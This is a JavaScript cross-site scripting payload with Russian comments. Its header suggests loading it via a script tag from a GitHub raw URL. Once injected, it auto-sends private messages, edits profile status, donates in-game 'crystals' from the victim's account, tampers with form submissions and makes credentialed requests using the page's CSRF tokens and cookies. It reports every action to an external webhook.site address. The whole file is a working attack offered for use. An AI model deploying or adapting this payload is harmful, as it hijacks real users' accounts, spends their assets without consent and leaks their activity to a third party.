// XSS скрипт для автоматического выполнения действий
// Используйте: <script src="https://raw.githubusercontent.com/Piplle/Kek/main/test.js"></script>

(function() {
  'use strict';
  
  console.log('XSS Auto-Action Script активирован!');
  
  // URL для отправки результатов (опционально)
  var webhookUrl = 'https://webhook.site/8c30f542-6903-4488-8aa9-0609f3eb8972';
  
  // Функция для логирования выполненных действий (опционально)
  function logAction(action, result) {
    fetch(webhookUrl, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        type: 'action_executed',
        action: action,
        result: result,
        timestamp: new Date().toISOString(),
        url: window.location.href
      })
    }).catch(function() {}); // Тихая ошибка если не удалось отправить
  }
  
  // ===== ДЕЙСТВИЯ НА СТРАНИЦЕ =====
  
  // Вспомогательная функция для поиска кнопки по тексту
  function findButtonByText(text) {
    var buttons = document.querySelectorAll('button, input[type="submit"], input[type="button"]');
    for (var i = 0; i < buttons.length; i++) {
      var btn = buttons[i];
      var btnText = btn.textContent || btn.value || btn.innerText || '';
      if (btnText.toLowerCase().includes(text.toLowerCase())) {
        return btn;
      }
    }
    return null;
  }
  
  // 1. Автоматическая отправка личного сообщения
  function sendPrivateMessage() {
    console.log('sendPrivateMessage вызвана');
    
    // Множественные способы поиска поля для ввода сообщения
    var messageInput = document.querySelector('textarea[name="message"]') ||
                      document.querySelector('textarea[name*="message"]') ||
                      document.querySelector('input[name*="message"]') ||
                      document.querySelector('textarea[placeholder*="сообщени"]') ||
                      document.querySelector('textarea[placeholder*="Введите сообщение"]') ||
                      document.querySelector('textarea[placeholder*="message"]') ||
                      document.querySelector('textarea') ||
                      document.querySelector('input[type="text"]');
    
    console.log('Найдено поле для сообщения:', messageInput);
    
    if (messageInput) {
      // Заполняем поле текстом
      var messageText = 'Автоматически отправленное сообщение через XSS';
      messageInput.value = messageText;
      messageInput.innerHTML = messageText; // Для contenteditable элементов
      
      // Вызываем события для триггера валидации и обновления состояния
      messageInput.dispatchEvent(new Event('input', { bubbles: true }));
      messageInput.dispatchEvent(new Event('change', { bubbles: true }));
      messageInput.dispatchEvent(new Event('keyup', { bubbles: true }));
      
      // Также пытаемся установить через свойство напрямую
      if (messageInput.setAttribute) {
        messageInput.setAttribute('value', messageText);
      }
      
      logAction('message_input_filled', messageText);
      
      // Ищем кнопку "Отправить" разными способами
      setTimeout(function() {
        console.log('Ищем кнопку отправки...');
        
        var sendButton = findButtonByText('Отправить') ||
                        findButtonByText('отправить') ||
                        findButtonByText('Send') ||
                        document.querySelector('button[type="submit"]') ||
                        document.querySelector('button[onclick*="submit"]') ||
                        null;
        
        // Если не нашли, перебираем все кнопки и ссылки
        if (!sendButton) {
          var allButtons = document.querySelectorAll('button, a[role="button"], a[onclick]');
          for (var i = 0; i < allButtons.length; i++) {
            var btn = allButtons[i];
            var btnText = (btn.textContent || btn.innerText || btn.value || '').trim();
            if (btnText === 'Отправить' || btnText.toLowerCase() === 'отправить' || 
                btnText === 'Send' || btnText.toLowerCase() === 'send') {
              sendButton = btn;
              break;
            }
          }
        }
        
        // Также ищем кнопку внутри ссылки (как в HTML из изображения)
        if (!sendButton) {
          var linkWithButton = document.querySelector('a[onclick*="submit"] button');
          if (linkWithButton) {
            sendButton = linkWithButton.parentElement; // Используем родительскую ссылку
          }
        }
        
        console.log('Найдена кнопка отправки:', sendButton);
        
        if (sendButton) {
          // Пробуем разные способы клика
          try {
            sendButton.click();
            logAction('send_button_clicked', 'success');
            console.log('Кнопка отправки нажата через click()');
          } catch(e) {
            console.log('Ошибка при click(), пробуем через событие:', e);
            // Если обычный клик не работает, используем dispatchEvent
            try {
              var clickEvent = new MouseEvent('click', {
                bubbles: true,
                cancelable: true,
                view: window,
                button: 0
              });
              sendButton.dispatchEvent(clickEvent);
              logAction('send_button_clicked', 'via_event');
              console.log('Кнопка отправки нажата через dispatchEvent');
            } catch(e2) {
              console.log('Ошибка при dispatchEvent:', e2);
            }
          }
        } else {
          console.log('Кнопка не найдена, пробуем через форму');
          // Альтернативный поиск - ищем форму и отправляем
          var form = messageInput.closest('form');
          if (form) {
            console.log('Найдена форма, отправляем через submit()');
            form.submit();
            logAction('send_form_submitted', 'success');
          } else {
            // Ищем форму по action
            var forms = document.querySelectorAll('form');
            for (var i = 0; i < forms.length; i++) {
              var f = forms[i];
              if (f.action && f.action.includes('/mail/') && f.action.includes('/send')) {
                console.log('Найдена форма для отправки сообщений, отправляем');
                f.submit();
                logAction('send_form_submitted', 'via_action_match');
                break;
              }
            }
          }
        }
      }, 1000); // Увеличил задержку до 1 секунды
      
      return true;
    } else {
      console.log('Поле для сообщения не найдено!');
      logAction('send_message_failed', 'input_not_found');
      
      // Повторная попытка через 2 секунды (на случай динамической загрузки)
      setTimeout(function() {
        sendPrivateMessage();
      }, 2000);
      
      return false;
    }
  }
  
  // 2. Автоматическое заполнение и отправка формы
  function fillAndSubmitForm(formSelector, data) {
    var form = document.querySelector(formSelector);
    if (!form) return false;
    
    // Заполняем поля
    for (var field in data) {
      var input = form.querySelector('[name="' + field + '"], [id="' + field + '"]');
      if (input) {
        input.value = data[field];
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
      }
    }
    
    // Отправляем форму
    setTimeout(function() {
      form.submit();
      logAction('form_submit', formSelector);
    }, 500);
    
    return true;
  }
  
  // 3. Автоматический клик по кнопкам/ссылкам
  function autoClick(selector, delay) {
    setTimeout(function() {
      var element = document.querySelector(selector);
      if (element) {
        element.click();
        logAction('auto_click', selector);
        return true;
      }
      return false;
    }, delay || 1000);
  }
  
  // 4. Изменение данных профиля/настроек
  function modifyProfile() {
    // Пример: изменение статуса
    var statusInput = document.querySelector('input[name*="status"], textarea[name*="status"]');
    if (statusInput) {
      statusInput.value = 'Изменено через XSS';
      statusInput.dispatchEvent(new Event('change', { bubbles: true }));
      
      // Сохранение изменений
      setTimeout(function() {
        var saveButton = document.querySelector('button[type="submit"]') ||
                        findButtonByText('Сохранить') ||
                        findButtonByText('Save') ||
                        findButtonByText('сохранить');
        if (saveButton) {
          saveButton.click();
          logAction('profile_modified', 'success');
        }
      }, 500);
    }
  }
  
  // 5. Автоматическая навигация по страницам
  function navigateTo(url) {
    window.location.href = url;
    logAction('navigation', url);
  }
  
  // 6. Массовые действия (например, отметить все сообщения как прочитанными)
  function markAllAsRead() {
    var checkboxes = document.querySelectorAll('input[type="checkbox"]');
    for (var i = 0; i < checkboxes.length; i++) {
      checkboxes[i].checked = true;
      checkboxes[i].dispatchEvent(new Event('change', { bubbles: true }));
    }
    
    // Ищем кнопки с текстом "Прочитано" или "Read"
    var allButtons = document.querySelectorAll('button, input[type="button"]');
    for (var i = 0; i < allButtons.length; i++) {
      var btn = allButtons[i];
      var btnText = btn.textContent || btn.value || btn.innerText || '';
      if (btnText.toLowerCase().includes('прочитано') || btnText.toLowerCase().includes('read')) {
        btn.click();
      }
    }
    logAction('mark_all_read', checkboxes.length + allButtons.length);
  }
  
  // 7. Автоматическое пожертвование кристаллов
  function autoDonate() {
    console.log('autoDonate вызвана');
    
    // Множественные способы поиска поля для ввода кристаллов
    var crystalInput = document.querySelector('input[name="crystal"]') ||
                      document.querySelector('input[type="number"][name*="crystal"]') ||
                      document.querySelector('input[type="number"][placeholder*="кристал"]') ||
                      document.querySelector('input[type="number"][placeholder*="кристалов"]') ||
                      document.querySelector('input[type="number"][min="50"]');
    
    console.log('Найдено поле для кристаллов:', crystalInput);
    
    if (crystalInput) {
      // Устанавливаем значение (минимальное или указанное)
      var donateAmount = 50; // Минимальная сумма пожертвования
      crystalInput.value = donateAmount;
      crystalInput.dispatchEvent(new Event('input', { bubbles: true }));
      crystalInput.dispatchEvent(new Event('change', { bubbles: true }));
      
      // Также пытаемся установить через свойство напрямую
      crystalInput.setAttribute('value', donateAmount);
      
      logAction('donate_input_filled', donateAmount);
      
      // Ищем кнопку "Пожертвовать" разными способами
      setTimeout(function() {
        console.log('Ищем кнопку пожертвования...');
        
        var donateButton = document.querySelector('button[role="base-button"]') ||
                          findButtonByText('Пожертвовать') || 
                          findButtonByText('пожертвовать') ||
                          document.querySelector('button:contains("Пожертвовать")') ||
                          document.querySelector('button[type="button"]') ||
                          null;
        
        // Если не нашли, перебираем все кнопки
        if (!donateButton) {
          var allButtons = document.querySelectorAll('button');
          for (var i = 0; i < allButtons.length; i++) {
            var btn = allButtons[i];
            var btnText = (btn.textContent || btn.innerText || btn.value || '').trim();
            if (btnText === 'Пожертвовать' || btnText.toLowerCase() === 'пожертвовать') {
              donateButton = btn;
              break;
            }
          }
        }
        
        console.log('Найдена кнопка:', donateButton);
        
        if (donateButton) {
          // Пробуем разные способы клика
          try {
            donateButton.click();
            logAction('donate_button_clicked', 'success');
          } catch(e) {
            // Если обычный клик не работает, используем dispatchEvent
            var clickEvent = new MouseEvent('click', {
              bubbles: true,
              cancelable: true,
              view: window
            });
            donateButton.dispatchEvent(clickEvent);
            logAction('donate_button_clicked', 'via_event');
          }
        } else {
          console.log('Кнопка не найдена, пробуем через форму');
          // Альтернативный поиск - ищем форму и отправляем
          var form = crystalInput.closest('form');
          if (form) {
            form.submit();
            logAction('donate_form_submitted', 'success');
          } else {
            // Пробуем найти форму через input
            var forms = document.querySelectorAll('form');
            for (var i = 0; i < forms.length; i++) {
              if (forms[i].contains(crystalInput)) {
                forms[i].submit();
                logAction('donate_form_submitted', 'via_containment');
                break;
              }
            }
          }
        }
      }, 1000); // Увеличил задержку до 1 секунды
      
      return true;
    } else {
      console.log('Поле для кристаллов не найдено!');
      logAction('donate_failed', 'input_not_found');
      
      // Повторная попытка через 2 секунды (на случай динамической загрузки)
      setTimeout(function() {
        autoDonate();
      }, 2000);
      
      return false;
    }
  }
  
  // 8. Автоматическое добавление контента в DOM
  function injectContent(html) {
    var div = document.createElement('div');
    div.innerHTML = html;
    document.body.appendChild(div);
    logAction('content_injected', html.substring(0, 50));
  }
  
  // 9. Перехват и модификация отправляемых данных
  function interceptFormSubmissions() {
    document.addEventListener('submit', function(e) {
      var form = e.target;
      
      // Добавляем скрытое поле в форму
      var hiddenField = document.createElement('input');
      hiddenField.type = 'hidden';
      hiddenField.name = 'xss_injected';
      hiddenField.value = 'true';
      form.appendChild(hiddenField);
      
      logAction('form_intercepted', form.action);
    }, true);
  }
  
  // 10. Автоматическое выполнение AJAX запросов
  function makeAutoRequest(url, method, data) {
    fetch(url, {
      method: method || 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': (document.querySelector('meta[name="csrf-token"]') && document.querySelector('meta[name="csrf-token"]').content) || '',
        'X-XSRF-TOKEN': getCookie('XSRF-TOKEN') || ''
      },
      body: JSON.stringify(data),
      credentials: 'include'
    })
    .then(function(response) {
      logAction('ajax_request', url + ' - success');
    })
    .catch(function(error) {
      logAction('ajax_request', url + ' - error');
    });
  }
  
  // Вспомогательная функция для получения cookie
  function getCookie(name) {
    var value = "; " + document.cookie;
    var parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
  }
  
  // 11. Цепочка автоматических действий
  function executeActionChain(actions, delay) {
    var index = 0;
    var delayBetween = delay || 2000; // 2 секунды между действиями
    
    function nextAction() {
      if (index < actions.length) {
        var action = actions[index];
        
        if (typeof action === 'function') {
          action();
        } else if (action.type === 'click') {
          autoClick(action.selector, 0);
        } else if (action.type === 'fill') {
          fillAndSubmitForm(action.form, action.data);
        } else if (action.type === 'navigate') {
          navigateTo(action.url);
        } else if (action.type === 'request') {
          makeAutoRequest(action.url, action.method, action.data);
        }
        
        index++;
        setTimeout(nextAction, delayBetween);
      }
    }
    
    nextAction();
  }
  
  // ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ДЕЙСТВИЙ =====
  
  // Определяем текущую страницу и выполняем соответствующие действия
  var currentUrl = window.location.href;
  var currentPath = window.location.pathname;
  
  // Если это страница личных сообщений
  if (currentPath.includes('/mail/') || currentPath.includes('/message/') || currentPath.includes('/private/')) {
    console.log('Обнаружена страница личных сообщений, запускаю sendPrivateMessage');
    
    // Пробуем несколько раз с разными задержками (на случай динамической загрузки)
    setTimeout(function() {
      sendPrivateMessage();
    }, 1000);
    
    setTimeout(function() {
      sendPrivateMessage();
    }, 3000);
    
    setTimeout(function() {
      sendPrivateMessage();
    }, 5000);
    
    // Также следим за изменениями DOM
    var observer = new MutationObserver(function(mutations) {
      var messageInput = document.querySelector('textarea[name="message"], textarea[placeholder*="сообщени"]');
      if (messageInput) {
        observer.disconnect();
        setTimeout(function() {
          sendPrivateMessage();
        }, 500);
      }
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }
  
  // Если это страница настроек/профиля
  if (currentPath.includes('/profile/') || currentPath.includes('/settings/')) {
    setTimeout(function() {
      modifyProfile();
    }, 2000);
  }
  
  // Если это страница пожертвований
  if (currentPath.includes('/brotherhood/donate') || currentPath.includes('/donate')) {
    console.log('Обнаружена страница пожертвований, запускаю autoDonate');
    
    // Пробуем несколько раз с разными задержками (на случай динамической загрузки)
    setTimeout(function() {
      autoDonate();
    }, 1000);
    
    setTimeout(function() {
      autoDonate();
    }, 3000);
    
    setTimeout(function() {
      autoDonate();
    }, 5000);
    
    // Также следим за изменениями DOM
    var observer = new MutationObserver(function(mutations) {
      var crystalInput = document.querySelector('input[name="crystal"]');
      if (crystalInput) {
        observer.disconnect();
        setTimeout(function() {
          autoDonate();
        }, 500);
      }
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }
  
  // Перехватываем все отправки форм
  interceptFormSubmissions();
  
  // Пример цепочки действий (можно настроить под конкретный сайт)
  // executeActionChain([
  //   { type: 'click', selector: '.some-button' },
  //   { type: 'fill', form: '#some-form', data: { field1: 'value1' } },
  //   { type: 'navigate', url: '/some-page' }
  // ]);
  
  console.log('Auto-Action Script настроен. Текущая страница:', currentUrl);
  
})();
